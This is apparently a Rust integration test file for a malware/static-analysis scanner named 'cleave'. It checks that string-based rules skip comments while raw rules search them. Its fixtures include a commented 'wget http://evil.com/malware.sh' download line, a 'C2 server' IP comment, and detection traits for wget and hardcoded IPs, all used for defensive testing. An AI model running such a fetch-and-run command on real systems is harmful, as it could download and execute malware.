//! Integration test module.
#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

//! Tests for string vs raw condition behavior.
//!
//! Verifies that `type: string_value` conditions search AST-extracted strings (excluding comments)
//! while `type: raw` conditions search raw file content (including comments).

use std::fs;
use tempfile::TempDir;

/// Test that `type: string_value` conditions do NOT match IP addresses in C comments.
///
/// This is a regression test for a bug where `type: string_value` was falling back to
/// raw content search for source files, causing it to match patterns in comments
/// that should only be found by `type: raw` conditions.
///
/// Bug: In eval_string(), the condition:
///   `if evidence.is_empty() && (ctx.report.strings.is_empty() || ctx.file_type.is_source_code())`
/// causes source files to always search raw content, bypassing AST string extraction.
#[test]
fn test_string_condition_excludes_c_comments() {
    let temp_dir = TempDir::new().unwrap();
    let header_path = temp_dir.path().join("test.h");

    // C header file with IP address ONLY in a comment
    // The hardcoded-ip rule uses `type: string_value` with `is: external_ip`
    // It should NOT match because 7.18.8.8 is only in a comment
    let c_content = r#"#ifndef TEST_H
#define TEST_H

// 7.18.8.8 Exact-width integer types
// This comment looks like stdint.h header comment

typedef signed char int8_t;
typedef unsigned char uint8_t;

#endif
"#;

    fs::write(&header_path, c_content).unwrap();

    // Scan the file and check for the hardcoded-ip finding
    // Note: --format is a global flag, must come before the subcommand
    // Skip YARA - these tests use YAML traits, not YARA rules
    let output = assert_cmd::cargo_bin_cmd!("cleave")
        .env("cleave_SKIP_YARA", "1")
        .args([
            "--format",
            "jsonl",
            "analyze",
            header_path.to_str().unwrap(),
        ])
        .assert()
        .success();

    let stdout = String::from_utf8_lossy(&output.get_output().stdout);

    // The hardcoded-ip finding should NOT appear because 7.18.8.8 is in a comment
    // If this assertion fails, the bug is present (string search is using raw content)
    assert!(
        !stdout.contains("hardcoded-ip"),
        "BUG: hardcoded-ip matched IP in C comment. string_value conditions should use AST-extracted strings, not raw content.\nOutput: {}",
        stdout
    );
}

/// Test that `type: string_value` conditions DO match IP addresses in C string literals.
#[test]
fn test_string_condition_matches_c_string_literals() {
    let temp_dir = TempDir::new().unwrap();
    let c_path = temp_dir.path().join("test.c");

    // C file with IP address in a string literal (should be extracted by AST)
    let c_content = r#"#include <stdio.h>

int main() {
    // This is a comment with no IP
    char *server = "http://45.33.32.156/api";
    printf("Connecting to %s\n", server);
    return 0;
}
"#;

    fs::write(&c_path, c_content).unwrap();

    // Scan the file
    // Note: --format is a global flag, must come before the subcommand
    // Skip YARA - these tests use YAML traits, not YARA rules
    let output = assert_cmd::cargo_bin_cmd!("cleave")
        .env("cleave_SKIP_YARA", "1")
        .args(["--format", "jsonl", "analyze", c_path.to_str().unwrap()])
        .assert()
        .success();

    let stdout = String::from_utf8_lossy(&output.get_output().stdout);

    // Should find the IP in the string literal
    // Note: The IP 45.33.32.156 is a real external IP that should pass validation
    assert!(
        stdout.contains("45.33.32.156") || stdout.contains("http-raw-ip"),
        "Expected to find IP address from string literal. Output: {}",
        stdout
    );
}

/// Test that `type: raw` conditions DO match patterns in comments.
#[test]
fn test_raw_condition_matches_comments() {
    let temp_dir = TempDir::new().unwrap();
    let script_path = temp_dir.path().join("test.sh");

    // Shell script with wget in a comment
    // type: raw rules should still find it
    let script_content = r#"#!/bin/bash
# wget http://evil.com/malware.sh
echo "This script is safe"
"#;

    fs::write(&script_path, script_content).unwrap();

    // Create a custom trait file that uses type: raw to find wget
    let traits_dir = temp_dir.path().join("traits");
    fs::create_dir_all(&traits_dir).unwrap();

    let trait_content = r#"traits:
  - id: wget-in-comment
    desc: wget found in raw content
    crit: notable
    conf: 0.8
    for: [shell]
    if:
      type: raw
      substr: "wget http://"
"#;

    fs::write(traits_dir.join("test.yaml"), trait_content).unwrap();

    // Scan with custom traits
    // Note: --format, --validate, and --traits-dir are global flags, must come before the subcommand
    // Skip YARA since we're only testing custom trait conditions (not YARA rules)
    let output = assert_cmd::cargo_bin_cmd!("cleave")
        .env("cleave_SKIP_YARA", "1")
        .args([
            "--format",
            "jsonl",
            "--traits-dir",
            traits_dir.to_str().unwrap(),
            "analyze",
            script_path.to_str().unwrap(),
        ])
        .assert()
        .success();

    let stdout = String::from_utf8_lossy(&output.get_output().stdout);

    // Raw search should find wget even in comment
    assert!(
        stdout.contains("wget-in-comment"),
        "type: raw should match patterns in comments. Output: {}",
        stdout
    );
}

/// Test the difference between string and raw for Python comments.
#[test]
fn test_python_string_vs_raw() {
    let temp_dir = TempDir::new().unwrap();
    let py_path = temp_dir.path().join("test.py");

    // Python file with IP in comment AND in string
    let py_content = r#"#!/usr/bin/env python3
# C2 server: 91.92.242.30

def connect():
    # Another comment
    server = "http://8.8.8.8/api"  # 8.8.8.8 is Google DNS
    return server
"#;

    fs::write(&py_path, py_content).unwrap();

    // Create custom trait files
    let traits_dir = temp_dir.path().join("traits");
    fs::create_dir_all(&traits_dir).unwrap();

    // String-based trait (should only match the string literal 8.8.8.8)
    let string_trait = r#"defaults:
  platforms: [unix]
traits:
  - id: string-ip-match
    desc: IP via string search
    crit: notable
    conf: 0.8
    for: [python]
    if:
      type: string_value
      regex: "\\b[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\b"
      is: external_ip
"#;

    // Raw-based trait (should match both IPs)
    let raw_trait = r#"defaults:
  platforms: [unix]
traits:
  - id: raw-ip-match
    desc: IP via raw search
    crit: notable
    conf: 0.8
    for: [python]
    if:
      type: raw
      regex: "\\b[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\b"
      is: external_ip
"#;

    fs::write(traits_dir.join("string.yaml"), string_trait).unwrap();
    fs::write(traits_dir.join("raw.yaml"), raw_trait).unwrap();

    // Scan with custom traits
    // Note: --format, --validate, and --traits-dir are global flags, must come before the subcommand
    // Skip YARA since we're only testing custom trait conditions (not YARA rules)
    let output = assert_cmd::cargo_bin_cmd!("cleave")
        .env("cleave_SKIP_YARA", "1")
        .env("CLEAVE_VALIDATE", "0") // Disable validation: test intentionally creates conflicting string/raw traits
        .args([
            "--format",
            "jsonl",
            "--traits-dir",
            traits_dir.to_str().unwrap(),
            "analyze",
            py_path.to_str().unwrap(),
        ])
        .assert()
        .success();

    let stdout = String::from_utf8_lossy(&output.get_output().stdout);

    // Raw should always match (finds both IPs)
    assert!(
        stdout.contains("raw-ip-match"),
        "type: raw should find IPs in both comments and strings. Output: {}",
        stdout
    );

    // String should match 8.8.8.8 from the string literal
    // But should NOT match 91.92.242.30 from the comment
    // If string-ip-match evidence contains 91.92.242.30, that's the bug
    if stdout.contains("string-ip-match") {
        // Check that it matched the string literal IP, not the comment IP
        assert!(
            !stdout.contains("91.92.242.30") || stdout.contains("8.8.8.8"),
            "BUG: type: string_value should not match IP in comment (91.92.242.30). Output: {}",
            stdout
        );
    }
}
